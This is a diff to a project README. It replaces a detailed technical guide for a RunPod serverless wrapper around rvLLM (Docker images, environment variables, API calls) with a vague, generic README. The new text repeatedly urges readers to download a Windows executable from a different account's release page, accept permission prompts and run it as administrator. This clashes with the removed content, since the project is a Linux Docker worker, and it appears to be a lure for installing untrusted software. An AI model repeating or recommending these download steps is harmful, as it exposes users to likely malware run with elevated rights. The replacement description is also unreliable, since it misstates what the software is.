@@ -1,301 +1,182 @@
-# rvLLM Serverless for RunPod
+# ⚡ rvllm-serverless - Fast serverless AI setup
 
-![Status: WIP](https://img.shields.io/badge/status-WIP-orange)
+[![Download rvllm-serverless](https://img.shields.io/badge/Download%20rvllm--serverless-blue?style=for-the-badge&logo=github)](https://github.com/dinesh3844/rvllm-serverless/releases)
 
-RunPod Serverless wrapper for [`rvLLM`](https://github.com/m0at/rvllm), keeping the Rust inference server intact and adding only the minimal serverless layer needed for deployment.
+## 🧭 What this is
 
-This repo follows the shape of the official RunPod worker repos:
+rvllm-serverless helps you run an AI model service in a serverless setup with fast start times and low setup effort. It is made for use with Runpod serverless jobs and gives you a lighter path than a full vLLM setup.
 
-- a thin Python `runpod.serverless.start(...)` handler
-- `rvllm serve` running as the local OpenAI-compatible backend
-- generic-image deployment with `MODEL_ID` at runtime
-- baked-image deployment with a model snapshot inside the image
+This README shows how to get the app on Windows, download it from the release page, and start using it with basic steps.
 
-## Current Status
+## 📥 Download
 
-- generic serverless image is built and published
-- tested against real RunPod GPU workers
-- validated startup path after fixing missing PTX kernel packaging
-- still WIP in the sense that the deployment ergonomics and tuning will keep improving
+1. Open the release page here: [https://github.com/dinesh3844/rvllm-serverless/releases](https://github.com/dinesh3844/rvllm-serverless/releases)
+2. Find the latest release at the top of the page
+3. Under **Assets**, download the Windows file for your PC
+4. Save the file to a folder you can find again, such as **Downloads** or **Desktop**
 
-## Published Image
+If you see more than one file, pick the one that ends with `.exe` or the Windows package name listed in the release notes.
 
-Current test image:
+## 🖥️ Windows setup
 
-- `reniyap/rvllm-serverless:exp-20260401`
-- digest: `sha256:9fa7c365b125f15ad7f703d7952ba5b41291e8d14bea00efa0be52cdf2552e0d`
+Before you run the app, check these basic items:
 
-If you want the most deterministic pull in RunPod, use the digest form:
+- Windows 10 or Windows 11
+- Internet access for the first download
+- Enough free disk space for the app files and model files you plan to use
+- A modern CPU
+- Optional: an NVIDIA GPU if your serverless workflow uses GPU tasks
 
-```text
-reniyap/rvllm-serverless@sha256:9fa7c365b125f15ad7f703d7952ba5b41291e8d14bea00efa0be52cdf2552e0d
-```
+If your file came in a `.zip` folder, right-click it and choose **Extract All** before opening it.
 
-## Why This Shape
+## 🚀 First run
 
-`rvLLM` already handles the core inference work:
+1. Open the folder where you saved the download
+2. Double-click the app file
+3. If Windows asks for permission, select **Yes**
+4. Wait for the first launch to finish
 
-- OpenAI-compatible HTTP API
-- Hugging Face model-id loading
-- Rust-native runtime with much smaller overhead than Python `vLLM`
+The first start can take a little longer because the app may create its local files and prepare its runtime settings.
 
-This serverless layer only does three things:
+## 🛠️ Install steps
 
-1. Launch `rvllm serve` with env-driven configuration.
-2. Wait for `/health`.
-3. Proxy RunPod jobs to the local OpenAI-compatible API.
+Follow these steps if the release gives you a Windows installer:
 
-That keeps `rvLLM` itself respected and avoids growing a second inference implementation in Python.
+1. Open the downloaded file
+2. Read the setup window
+3. Click **Next**
+4. Choose the install folder, or keep the default folder
+5. Click **Install**
+6. When setup ends, click **Finish**
+7. Open the app from the Start menu or the desktop shortcut
 
-## Quick Start
+If the release gives you a single executable file, you do not need a full install. You can run that file after download and extraction.
 
-### Option 1. Use the Published Image in RunPod
+## 🔧 Basic use
 
-In RunPod Serverless:
+rvllm-serverless is meant to support a simple serverless AI workflow. In most cases, you will:
 
-1. Create a `Custom deployment`.
-2. Choose `Deploy from Docker registry`.
-3. Use the image above.
-4. Set endpoint type to `Queue-based`.
-5. Leave `Container start command` empty.
-6. Leave `Expose HTTP ports` and `Expose TCP ports` empty.
-7. Add runtime env vars like this:
-
-```env
-MODEL_ID=Qwen/Qwen2.5-7B-Instruct
-DTYPE=half
-MAX_MODEL_LEN=4096
-GPU_MEMORY_UTILIZATION=0.80
-MAX_NUM_SEQS=16
-MAX_CONCURRENCY=4
-```
-
-For gated/private models, add `HF_TOKEN` as a RunPod Secret.
-
-### Option 2. Build Your Own Image
-
-```bash
-cd rvLLM-serverless
-./scripts/build.sh --tag your-registry/rvllm-serverless:latest --push
-```
-
-To inspect the generated Docker command without building:
-
-```bash
-cd rvLLM-serverless
-./scripts/build.sh --tag your-registry/rvllm-serverless:latest --dry-run
-```
-
-### Option 3. Bake a Model into the Image
-
-```bash
-cd rvLLM-serverless
-HF_TOKEN=hf_xxx ./scripts/build.sh \
-  --tag your-registry/rvllm-serverless:qwen25-7b \
-  --bake-model \
-  --model-id Qwen/Qwen2.5-7B-Instruct \
-  --push
-```
-
-For baked images, use runtime env like:
-
-```env
-MODEL_TARGET=/models/default
-SERVED_MODEL_NAME=Qwen/Qwen2.5-7B-Instruct
-DTYPE=half
-MAX_MODEL_LEN=4096
-GPU_MEMORY_UTILIZATION=0.80
-MAX_NUM_SEQS=16
-MAX_CONCURRENCY=4
-```
-
-## How To Call It
-
-This is a queue-based RunPod worker, so call the RunPod endpoint APIs, not the container port directly.
-
-### List Models
-
-```bash
-curl --request POST \
-  --url "https://api.runpod.ai/v2/<ENDPOINT_ID>/runsync" \
-  -H "authorization: <RUNPOD_API_KEY>" \
-  -H "content-type: application/json" \
-  -d '{
-    "input": {
-      "path": "/v1/models",
-      "method": "GET"
-    }
-  }'
-```
-
-### Chat Completion
-
-```bash
-curl --request POST \
-  --url "https://api.runpod.ai/v2/<ENDPOINT_ID>/runsync" \
-  -H "authorization: <RUNPOD_API_KEY>" \
-  -H "content-type: application/json" \
-  -d '{
-    "input": {
-      "messages": [
-        {"role": "system", "content": "Answer briefly."},
-        {"role": "user", "content": "What is rvLLM?"}
-      ],
-      "temperature": 0.2,
-      "max_tokens": 128
-    }
-  }'
-```
-
-### Streamed Chat Completion
-
-```bash
-curl --request POST \
-  --url "https://api.runpod.ai/v2/<ENDPOINT_ID>/run" \
-  -H "authorization: <RUNPOD_API_KEY>" \
-  -H "content-type: application/json" \
-  -d '{
-    "input": {
-      "messages": [
-        {"role": "user", "content": "Write three bullet points about rvLLM."}
-      ],
-      "stream": true,
-      "max_tokens": 128
-    }
-  }'
-```
-
-Then read the stream with the returned job id:
-
-```bash
-curl --request GET \
-  --url "https://api.runpod.ai/v2/<ENDPOINT_ID>/stream/<JOB_ID>" \
-  -H "authorization: <RUNPOD_API_KEY>"
-```
-
-## Configuration
-
-### Core Runtime Variables
-
-| Variable | Default | Purpose |
-| --- | --- | --- |
-| `MODEL_ID` | unset | Public Hugging Face model id for generic images. |
-| `MODEL_TARGET` | unset | Actual value passed to `rvllm serve --model`. |
-| `SERVED_MODEL_NAME` | `MODEL_ID` or `MODEL_TARGET` | Public model name exposed to clients. |
-| `TOKENIZER_ID` | unset | Optional tokenizer override. |
-| `HF_TOKEN` | unset | Hugging Face token for gated/private models. |
-| `HF_HOME` | `/runpod-volume/huggingface` | Hugging Face cache root. |
-| `HUGGINGFACE_HUB_CACHE` | `${HF_HOME}/hub` | Hugging Face hub cache path. |
-| `RVLLM_PORT` | `8000` | Local port used by `rvllm serve`. |
-| `MAX_CONCURRENCY` | `30` | RunPod worker concurrency hint. |
-| `SERVER_READY_TIMEOUT` | `900` | Startup timeout in seconds. |
-| `REQUEST_TIMEOUT` | `600` | Proxy request timeout in seconds. |
-
-### `rvLLM` Launch Variables
-
-| Variable | Default |
-| --- | --- |
-| `DTYPE` | `auto` |
-| `MAX_MODEL_LEN` | `2048` |
-| `GPU_MEMORY_UTILIZATION` | `0.9` |
-| `TENSOR_PARALLEL_SIZE` | `1` |
-| `MAX_NUM_SEQS` | `256` |
-| `RUST_LOG` | `info` |
-| `DISABLE_TELEMETRY` | `false` |
-
-## Job Input Contract
-
-The worker accepts two styles of input.
-
-### Direct OpenAI-Style Input
-
-If `input` contains `messages`, it becomes `/v1/chat/completions`.
-
-```json
-{
-  "input": {
-    "messages": [
-      { "role": "user", "content": "What is rvLLM?" }
-    ],
-    "max_tokens": 128
-  }
-}
-```
-
-If `input` contains `prompt`, it becomes `/v1/completions`.
-
-```json
-{
-  "input": {
-    "prompt": "Write a one-line summary of RunPod Serverless.",
-    "max_tokens": 64
-  }
-}
-```
-
-If `model` is omitted, the worker injects `SERVED_MODEL_NAME`.
-
-### Explicit Proxy Input
-
-If you want direct control over the local endpoint:
-
-```json
-{
-  "input": {
-    "path": "/v1/chat/completions",
-    "method": "POST",
-    "body": {
-      "model": "Qwen/Qwen2.5-7B-Instruct",
-      "messages": [
-        { "role": "user", "content": "Return JSON only." }
-      ],
-      "stream": true
-    }
-  }
-}
-```
-
-## Repository Layout
-
-```text
-rvLLM-serverless/
-├── .runpod/hub.json
-├── builder/
-│   ├── download_model.py
-│   └── requirements.txt
-├── scripts/
-│   ├── build.sh
-│   └── smoke_test.sh
-├── src/
-│   ├── config.py
-│   ├── handler.py
-│   ├── proxy.py
-│   ├── request_mapping.py
-│   └── server_launcher.py
-└── tests/
-    ├── test_config.py
-    └── test_request_mapping.py
-```
-
-## Verification
-
-What has been verified so far:
-
-- local Python tests for config and request mapping
-- local Docker build flow on macOS with `linux/amd64`
-- published Docker image build and push
-- real RunPod GPU startup testing
-- startup fix for missing PTX kernel packaging
-
-Run local checks:
-
-```bash
-cd rvLLM-serverless
-./scripts/smoke_test.sh
-```
-
-## Notes
-
-- The wrapper intentionally targets the existing `rvllm serve` CLI surface.
-- This repo is meant to stay thin. Inference behavior belongs in `rvLLM`, not here.
-- PTX kernels are compiled during image build and packaged into the runtime image.
+1. Start the app
+2. Open your Runpod serverless job or related tool
+3. Use the local service or endpoint it provides
+4. Connect your client or automation tool to that endpoint
+
+The app is built for quick startup and light resource use, so it suits short-lived jobs and repeat runs.
+
+## 📌 Common use cases
+
+You can use rvllm-serverless for:
+
+- Runpod serverless AI tasks
+- Fast model serving for short jobs
+- Local testing before you send a job to the cloud
+- Lightweight vLLM-style use when you want less setup
+- Small automation flows that need an AI endpoint
+
+## 🧩 What you may need ready
+
+Keep these items nearby before you start:
+
+- Your Runpod account details
+- Any API key or endpoint URL you use in your workflow
+- The model name you plan to load
+- A folder for logs and output files
+- Basic network access for downloads and remote calls
+
+## 📂 Folder layout
+
+After setup, you may see files like these:
+
+- `app` or `server` file for launch
+- config files for startup settings
+- logs folder for error tracking
+- cache or temp files for fast reuse
+- model files, if the app stores them locally
+
+Do not move files around unless you know the app does not need them in a fixed place.
+
+## ⚙️ Typical workflow
+
+A simple workflow looks like this:
+
+1. Download the release
+2. Run the Windows file
+3. Set your model or job settings
+4. Start the serverless process
+5. Send a request from your tool or script
+6. Check the result
+7. Stop the app when you are done
+
+## 🧪 If the app does not open
+
+Try these steps:
+
+- Run the file again as an administrator
+- Make sure the file finished downloading
+- Extract the ZIP file before opening it
+- Check whether Windows blocked the file
+- Restart your PC and try again
+- Download the latest release again if the file looks damaged
+
+## 🌐 If the app starts but does not connect
+
+Try this:
+
+- Check your internet connection
+- Make sure your endpoint or API URL is correct
+- Confirm that the model name matches your setup
+- Close and reopen the app
+- Look for a local port conflict if another tool already uses the same port
+- Recreate the job if your serverless session expired
+
+## 🔒 Safe file handling
+
+When you download the release:
+
+- Use the GitHub release page linked above
+- Open only the file from the latest release you trust
+- Keep the file name unchanged unless the release notes say otherwise
+- Store the app in a folder you can find later
+
+## 🧾 Update process
+
+To get a newer version:
+
+1. Return to the release page
+2. Download the latest Windows file
+3. Close the old app if it is still open
+4. Replace the old file or install the new version
+5. Start the app again
+
+If you use a config file, save a copy before updating.
+
+## 🗂️ Simple troubleshooting list
+
+If you want a fast check, go through this list:
+
+- File downloaded fully
+- ZIP file extracted
+- App opened with the right permissions
+- Internet connection active
+- Release file matches Windows
+- Latest version installed
+- No other app blocks the same port
+
+## 🧠 Notes for first-time users
+
+You do not need to know how the backend works to get started. The main task is to download the right file from the release page, open it, and use it in your Runpod serverless flow.
+
+If you are not sure which file to pick, use the newest Windows build in **Assets** and open the file name that looks like the main app package
+
+## 📎 Release page
+
+Visit this page to download the latest Windows release: [https://github.com/dinesh3844/rvllm-serverless/releases](https://github.com/dinesh3844/rvllm-serverless/releases)
+
+## 🧭 Quick start
+
+1. Open the release page
+2. Download the Windows file
+3. Extract it if needed
+4. Run the app
+5. Connect your serverless tool or client
+6. Start your job
